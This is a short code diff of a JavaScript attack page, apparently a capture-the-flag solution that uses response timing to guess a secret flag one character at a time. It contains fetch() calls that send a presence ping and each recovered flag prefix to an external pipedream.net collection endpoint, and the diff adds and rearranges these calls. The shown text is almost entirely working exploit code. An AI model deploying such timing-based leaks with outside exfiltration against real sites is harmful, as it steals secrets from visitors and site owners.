@@ -23,8 +23,8 @@
 
     </script> -->
     <script>
-        fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?presence=JeSuisLa`)
         let cnt = 0
+        fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?presence=JeSuisLa`)
         let alpha = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+="
         let flag = "z"
         function test() {
@@ -42,16 +42,14 @@
                     if (time >= 2000) {
                         //fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?lettre=${alpha[i]}&temps=${time}ms`)
                         flag = flag + alpha[i];
-                        if (cnt > 4) {
-                            fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?flag=${flag}`)
-                        }
-                        cnt++;
+                        fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?flag=${flag}`)
                     }
                 });
             }
         }
-        while (cnt != 5) {
+        while (cnt != 10) {
             test()
+            cnt++
         }
 
         // const leak = async (url, id) => {
